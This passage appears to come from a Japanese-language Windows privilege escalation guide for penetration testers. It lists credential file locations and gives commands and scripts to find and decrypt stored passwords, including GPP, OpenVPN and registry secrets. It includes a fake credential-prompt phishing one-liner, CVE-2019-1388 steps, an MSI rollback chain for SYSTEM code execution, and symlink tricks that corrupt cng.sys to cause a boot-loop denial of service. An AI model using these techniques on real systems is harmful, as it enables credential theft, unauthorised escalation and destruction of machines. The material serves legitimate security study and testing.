C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
**metasploit**を使用して、これらのファイルを検索することもできます: _post/windows/gather/enum_unattend_

内容の例:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM バックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウド認証情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** という名前のファイルを検索します。

### Cached GPP Password

以前は、Group Policy Preferences（GPP）を使用して、複数のマシンにカスタムローカル administrator アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。第一に、SYSVOL に XML ファイルとして保存されている Group Policy Objects（GPO）は、すべてのドメインユーザーからアクセス可能でした。第二に、公開されているデフォルトキーを使用して AES256 で暗号化された、これらの GPP 内のパスワードは、認証済みユーザーであれば誰でも復号できました。これにより、ユーザーが elevated privileges を取得できる重大なリスクが生じていました。

このリスクを軽減するため、空でない `"cpassword"` フィールドを含む、ローカルにキャッシュされた GPP ファイルをスキャンする function が開発されました。このようなファイルが見つかると、function はパスワードを復号し、カスタム PowerShell object を返します。この object には、GPP に関する詳細とファイルの場所が含まれており、この security vulnerability の特定と remediation に役立ちます。

`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（W Vista より前）_ で、次のファイルを検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexecを使用してパスワードを取得する：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
認証情報を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 認証情報を尋ねる

ユーザーが別のユーザーの認証情報を知っている可能性があると思う場合は、いつでも**ユーザーに自分の認証情報、あるいは別のユーザーの認証情報を入力するよう求める**ことができます（クライアントに直接**認証情報**を**尋ねる**のは非常に**リスクが高い**ことに注意してください）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **認証情報を含む可能性のあるファイル名**

以前、**パスワード**を**平文**または**Base64**で含んでいた既知のファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
提案されたすべてのファイルを検索します:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### ごみ箱内の認証情報

認証情報がないか確認するため、ごみ箱も確認してください

複数のプログラムによって保存された**パスワードを復元する**には、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**認証情報を含む可能性があるその他のレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

**Chrome または Firefox** のパスワードが保存されている dbs を確認する必要があります。\
また、ブラウザの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが**保存されている可能性があります。

ブラウザからパスワードを抽出するツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は Windows operating system に組み込まれた technology で、異なる言語で作られた software components 間の**相互通信**を可能にします。各 COM component は **class ID (CLSID)** によって**識別され**、各 component は 1 つ以上の interface を通じて機能を提供します。interface は interface IDs (IIDs) によって識別されます。

COM classes と interfaces は、それぞれ registry の **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** の下で定義されています。この registry は **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.** をマージすることで作成されます。

この registry の CLSIDs 内には、child registry **InProcServer32** があります。ここには **DLL** を指す**デフォルト値**と、**ThreadingModel** という値が含まれています。**ThreadingModel** には **Apartment** (Single-Threaded)、**Free** (Multi-Threaded)、**Both** (Single or Multi)、**Neutral** (Thread Neutral) を指定できます。

![Browsers History - COM DLL Overwriting: この registry の CLSIDs 内には child registry InProcServer32 があり、DLL を指すデフォルト値と、値...](<../../images/image (729).png>)

基本的に、実行されるいずれかの **DLL を overwrite** でき、その DLL が別の user によって実行されるのであれば、**privileges を escalate** できます。

攻撃者が persistence mechanism として COM Hijacking を使用する方法については、以下を確認してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**ファイルの内容を検索**する**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリでキー名とパスワードを検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatically search for all the files containing passwords mentioned in this page.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is another great tool to extract password from a system.

The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) search for **sessions**, **usernames** and **passwords** of several tools that save this data in clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

**SYSTEM として実行されているプロセスが、完全なアクセス権限で新しいプロセス**（`OpenProcess()`）を開いたとします。さらに同じプロセスが、**メインプロセスのすべてのオープンハンドルを継承する、低い権限の新しいプロセス**（`CreateProcess()`）を作成したとします。\
その後、**低い権限のプロセスに対する完全なアクセス権限**を持っていれば、`OpenProcess()` によって作成された特権プロセスへの**オープンハンドル**を取得し、**shellcode を inject**できます。\
**この脆弱性を検出して exploit する方法**の詳細については、[この例](leaked-handle-exploitation.md)を参照してください。\
**異なる権限レベルで継承されたプロセスおよびスレッドの、より多くのオープンハンドル（完全なアクセス権限だけではありません）をテストして abuse する方法**については、[**こちらの別の post**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)で、より詳しく説明されています。

## Named Pipe Client Impersonation

**pipes** と呼ばれる共有メモリセグメントにより、プロセス間の通信とデータ転送が可能になります。

Windows には **Named Pipes** と呼ばれる機能があり、異なるネットワーク上にある場合でも、無関係なプロセス間でデータを共有できます。これは client/server アーキテクチャに似ており、役割は **named pipe server** と **named pipe client** として定義されます。

**client** が pipe を介してデータを送信すると、pipe を設定した **server** は、必要な **SeImpersonate** 権限を持っている場合、**client の identity を引き受ける**ことができます。模倣可能な pipe を介して通信する**特権プロセス**を特定できれば、自分で確立した pipe とそのプロセスが通信した時点で、そのプロセスの identity を引き受けることにより、**より高い権限を取得**できる可能性があります。この攻撃を実行する手順については、[**こちら**](named-pipe-client-impersonation.md)および[**こちら**](#from-high-integrity-to-system)のガイドを参照してください。

また、次の tool を使用すると、burp のような tool で **named pipe の通信を intercept**できます。[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **さらに、この tool を使用すると、privescs を見つけるためにすべての pipe を一覧表示して確認できます** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service（TapiSrv）は server mode で `\\pipe\\tapsrv`（MS-TRP）を公開します。remote authenticated client は、mailslot ベースの async event path を abuse して、`ClientAttach` を `NETWORK SERVICE` が書き込み可能な既存ファイルへの任意の **4-byte write** に変換し、その後 Telephony admin 権限を取得して、service として任意の DLL を load できます。完全な flow は次のとおりです。

- `pszDomainUser` に書き込み可能な既存 path を設定して `ClientAttach` を実行する → service は `CreateFileW(..., OPEN_EXISTING)` を介してそのファイルを開き、async event の書き込みに使用します。
- 各 event は、`Initialize` から attacker が制御する `InitContext` をその handle に書き込みます。`LRegisterRequestRecipient`（`Req_Func 61`）で line app を登録し、`TRequestMakeCall`（`Req_Func 121`）を trigger し、`GetAsyncEvents`（`Req_Func 0`）で取得した後、unregister/shutdown して deterministic な書き込みを繰り返します。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分自身を追加し、reconnect した後、任意の DLL path を指定して `GetUIDllName` を呼び出すことで、`NETWORK SERVICE` として `TSPI_providerUIIdentify` を実行します。

詳細については、次を参照してください。

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

**[https://filesec.io/](https://filesec.io/)** の page を確認してください。

### Protocol handler / ShellExecute abuse via Markdown renderers

`ShellExecuteExW` に転送されるクリック可能な Markdown link は、危険な URI handler（`file:`、`ms-appinstaller:`、または登録済みの任意の scheme）を trigger し、現在の user として attacker が制御する file を execute する可能性があります。次を参照してください。

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

user として shell を取得した際、**command line で credentials を渡す** scheduled task やその他の process が実行されている場合があります。以下の script は、2 秒ごとに process の command line を capture し、現在の state と直前の state を比較して、差分を出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからパスワードを窃取する

## Low Priv User から NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（コンソールまたは RDP 経由）にアクセスでき、UAC が有効になっている場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーからターミナルや、"NT\AUTHORITY SYSTEM" などの他のプロセスを実行できます。

これにより、同じ脆弱性を利用して、権限昇格と UAC Bypass を同時に実行できます。さらに、何もインストールする必要はなく、そのプロセス中に使用されるバイナリは Microsoft によって署名および発行されています。

影響を受けるシステムには、次のものがあります:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性をexploitするには、以下の手順を実行する必要があります。
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
リポジトリには必要なファイルと情報がすべて含まれています：

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium から High Integrity Level / UAC Bypass へ

**Integrity Levels**について学ぶには、こちらを読んでください：


{{#ref}}
integrity-levels.md
{{#endref}}

次に、**UAC と UAC bypasses**について学ぶには、こちらを読んでください：


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename から SYSTEM EoP へ

[**この blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)で説明されている technique で、exploit code は[**こちらで入手できます**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。<sup>[[31]](#references)[[32]](#references)</sup>

この attack は基本的に、Windows Installer の rollback feature を悪用し、uninstallation process 中に正規のファイルを malicious なファイルへ置き換えます。このため attacker は、**malicious MSI installer**を作成する必要があります。これは `C:\Config.Msi` folder を hijack するために使用されます。この folder は後で Windows Installer によって、他の MSI packages の uninstallation 中に rollback files を保存するために使用されます。その際、rollback files は malicious payload を含むように変更されます。

この technique の概要は次のとおりです：

1. **Stage 1 – Hijack の準備（`C:\Config.Msi` を空にする）**

- Step 1: MSI を install する
- Writable folder（`TARGETDIR`）に無害な file（例：`dummy.txt`）を install する `.msi` を作成します。
- **"UAC Compliant"** として installer に mark を付け、**non-admin user**が実行できるようにします。
- install 後も file への **handle** を open のままにします。

- Step 2: Uninstall を開始する
- 同じ `.msi` を uninstall します。
- Uninstall process が file を `C:\Config.Msi` に移動し、`.rbf` files（rollback backups）へ rename し始めます。
- `GetFinalPathNameByHandle` を使用して **open file handle を poll**し、file が `C:\Config.Msi\<random>.rbf` になったことを検出します。

- Step 3: Custom Syncing
- `.msi` には**custom uninstall action（`SyncOnRbfWritten`）**が含まれており、次の処理を行います：
- `.rbf` が write されたことを signal します。
- その後、uninstall を続行する前に別の event を wait します。

- Step 4: `.rbf` の deletion を block する
- signal を受け取ったら、`FILE_SHARE_DELETE` なしで **`.rbf` file を open**します。これにより、file の deletion が**防止**されます。
- 次に signal を返し、uninstall を完了できるようにします。
- Windows Installer は `.rbf` の deletion に失敗し、すべての contents を delete できないため、`C:\Config.Msi` は削除されません。

- Step 5: `.rbf` を手動で delete する
- あなた（attacker）が `.rbf` file を手動で delete します。
- これで **`C:\Config.Msi` は空**になり、hijack の準備が整います。

> この時点で、**SYSTEM-level arbitrary folder delete vulnerability**を trigger して `C:\Config.Msi` を delete します。

2. **Stage 2 – Rollback Scripts を Malicious なものに置き換える**

- Step 6: Weak ACLs を設定して `C:\Config.Msi` を再作成する
- `C:\Config.Msi` folder を自分で再作成します。
- **weak DACLs**（例：Everyone:F）を設定し、`WRITE_DAC` を持つ **handle を open のまま**にします。

- Step 7: 別の Install を実行する
- 次の設定で `.msi` を install します：
- `TARGETDIR`: Writable location。
- `ERROROUT`: forced failure を trigger する variable。
- この install は、`.rbs` と `.rbf` を read する **rollback**を再度 trigger するために使用されます。

- Step 8: `.rbs` を monitor する
- `ReadDirectoryChangesW` を使用して `C:\Config.Msi` を monitor し、新しい `.rbs` が現れるまで待ちます。
- その filename を capture します。

- Step 9: Rollback 前に Sync する
- `.msi` には**custom install action（`SyncBeforeRollback`）**が含まれており、次の処理を行います：
- `.rbs` が create されたときに event を signal します。
- その後、続行する前に wait します。

- Step 10: Weak ACL を再適用する
- `.rbs created` event を受信すると：
- Windows Installer は `C:\Config.Msi` に**strong ACLs を再適用**します。
- しかし、`WRITE_DAC` を持つ handle をまだ保持しているため、**weak ACLs を再適用**できます。

> ACLs は**handle open 時にのみ enforce される**ため、folder に write することは引き続き可能です。

- Step 11: Fake `.rbs` と `.rbf` を drop する
- `.rbs` file を fake rollback script で overwrite します。この script は Windows に次の処理を指示します：
- `.rbf` file（malicious DLL）を**privileged location**（例：`C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）へ restore する。
- **malicious SYSTEM-level payload DLL**を含む fake `.rbf` を drop する。

- Step 12: Rollback を trigger する
- sync event を signal して installer を resume させます。
- **type 19 custom action（`ErrorOut`）**は、既知の point で install を**意図的に fail**させるよう設定されています。
- これにより **rollback が開始**されます。

- Step 13: SYSTEM が DLL を install する
- Windows Installer は次の処理を行います：
- malicious な `.rbs` を read します。
- `.rbf` DLL を target location に copy します。
- これで **SYSTEM が load する path に malicious DLL**が配置されます。

- Final Step: SYSTEM Code を execute する
- DLL を load する trusted な **auto-elevated binary**（例：`osk.exe`）を実行します。
- **Boom**：code が **SYSTEM として**実行されます。


### Arbitrary File Delete/Move/Rename から SYSTEM EoP へ

main MSI rollback technique（前述のもの）は、**entire folder**（例：`C:\Config.Msi`）を delete できることを前提としています。しかし、vulnerability が **arbitrary file deletion** しか許可しない場合はどうでしょうか？

**NTFS internals**を exploit できます。すべての folder には、次の名前の hidden alternate data stream があります：
```
C:\SomeFolder::$INDEX_ALLOCATION
```
この stream には、フォルダーの **インデックス メタデータ** が保存されています。

そのため、フォルダーの **`::$INDEX_ALLOCATION` stream** を **削除**すると、NTFS はファイルシステムから **フォルダー全体を削除**します。

これは、次のような標準のファイル削除 API を使用して実行できます。
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete APIを呼び出しているにもかかわらず、**フォルダー自体が削除されます**。

### フォルダーの内容の削除からSYSTEM EoPへ
プリミティブが任意のファイル／フォルダーを削除できなくても、**攻撃者が制御するフォルダーの*内容*を削除できる**場合はどうでしょうか？

1. Step 1: 囮フォルダーとファイルをセットアップする
- 作成: `C:\temp\folder1`
- その中に作成: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock により**実行が一時停止**します。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM process（例: `SilentCleanup`）をトリガーする
- このプロセスはフォルダー（例: `%TEMP%`）をスキャンし、その内容を削除しようとする。
- `file1.txt` に到達すると、**oplock がトリガー**され、制御があなたの callback に渡される。

4. Step 4: oplock callback 内で削除先をリダイレクトする

- Option A: `file1.txt` を別の場所へ移動する
- これにより、oplock を壊さずに `folder1` を空にできる。
- `file1.txt` を直接削除しないこと。削除すると、oplock が早期に解放される。

- Option B: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これはフォルダーのメタデータを格納する NTFS 内部ストリームを対象としています。これを削除すると、フォルダーが削除されます。

5. Step 5: oplock を解放する
- SYSTEM プロセスは処理を続行し、`file1.txt` の削除を試みます。
- しかし、junction + symlink により、実際に削除されるのは次のものです：
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**結果**: `C:\Config.Msi` は SYSTEM によって削除されます。

### 任意のフォルダー作成から恒久的な DoS へ

**ファイルを書き込めない**、または**弱い権限を設定できない**場合でも、**SYSTEM/admin として任意のフォルダーを作成できる** primitive を悪用します。

**critical Windows driver** の名前を付けた**フォルダー**（ファイルではありません）を作成します。例:
```
C:\Windows\System32\cng.sys
```
- このパスは通常、`cng.sys` kernel-mode driver に対応します。
- **folder として事前に作成**すると、Windows は boot 時に実際の driver の読み込みに失敗します。
- その後、Windows は boot 中に `cng.sys` の読み込みを試みます。
- folder を検出すると、**実際の driver の解決に失敗**し、**crash または boot の停止**が発生します。
- **fallback はなく**、外部からの介入（例: boot repair または disk access）なしには**復旧できません**。

### privileged log/backup paths + OM symlinks から arbitrary file overwrite / boot DoS へ

**privileged service** が **writable config** から読み取ったパスへ logs/exports を書き込む場合、**Object Manager symlinks + NTFS mount points** でそのパスを redirect し、**SeCreateSymbolicLinkPrivilege がなくても** privileged write を arbitrary overwrite に変えられます。<sup>[[15]](#references)</sup>

**Requirements**
- target path を保存している config が attacker によって writable であること（例: `%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。<sup>[[16]](#references)[[17]](#references)</sup>
- そのパスへ書き込む privileged operation（log、export、report）。

**Example chain**
1. config を読み取り、privileged log destination を復元します。例: `C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. admin 権限なしでパスを redirect します。
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待ちます（例：管理者が「テスト SMS を送信」を実行する）。これで書き込み先は `C:\Windows\System32\cng.sys` になります。
4. 上書きされたターゲットを検査し（hex/PE parser）、破損を確認します。再起動すると Windows が改変された driver path を読み込むため、**boot loop DoS** が発生します。これは、特権サービスが書き込み用に開く保護対象ファイル全般にも応用できます。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれますが、`C:\Windows\System32\cng.sys` にコピーが存在する場合、先にそちらが試行される可能性があるため、破損データの信頼性の高い DoS sink になります。



## **High Integrity から SYSTEM へ**

### **新しい service**

すでに High Integrity process 上で実行している場合、**SYSTEM への path** は、新しい service を**作成して実行する**だけで簡単に確立できます。
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> service binary を作成する際は、それが有効な service であること、または binary が必要なアクションを十分速く実行することを確認してください。有効な service でない場合、20s 後に kill されます。

### AlwaysInstallElevated

High Integrity process から、**AlwaysInstallElevated registry entries を enable** し、_**.msi**_ wrapper を使用して reverse shell を**install**できます。\
[関連する registry keys と _.msi_ package の install 方法についての詳細はこちら。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードは** [**こちらにあります**](seimpersonate-from-high-to-system.md)**。**

### From SeDebug + SeImpersonate to Full Token privileges

これらの token privileges を持っている場合（おそらく、すでに High Integrity process 内にいるときに見つかります）、SeDebug privilege を使用して（protected processes 以外の）**ほぼすべての process を open**し、その process の **token を copy**して、その token を使用した **arbitrary process を作成**できます。\
通常、この technique では、**すべての token privileges を持つ SYSTEM として実行されている process を選択**します（_すべての token privileges を持たない SYSTEM processes も見つけられます_）。\
**提案した technique を実行するコードの** [**exampleはこちら**](sedebug-+-seimpersonate-copy-token.md)**です。**

### **Named Pipes**

この technique は、`getsystem` で privilege escalation を行うために meterpreter が使用します。この technique では、**pipe を作成し、その pipe に write するための service を作成または abuse**します。その後、**`SeImpersonate`** privilege を使用して pipe を作成した **server** は、pipe client（service）の **token を impersonate**し、SYSTEM privileges を取得できます。\
name pipes について[**さらに学びたい場合はこちらを読んでください**](#named-pipe-client-impersonation)。\
name pipes を使用して [**high integrity から System に移行する方法の exampleはこちら**](from-high-integrity-to-system-with-name-pipes.md)を読んでください。

### Dll Hijacking

**SYSTEM** として実行されている **process** によって **load**される dll の **hijack**に成功すれば、その permissions で arbitrary code を実行できます。したがって Dll Hijacking はこの種の privilege escalation にも有用であり、さらに、dll の load に使用される folders に **write permissions** があるため、**high integrity process からのほうがはるかに簡単に実行できます**。\
**Dll hijacking については** [**こちらで詳細を学べます**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

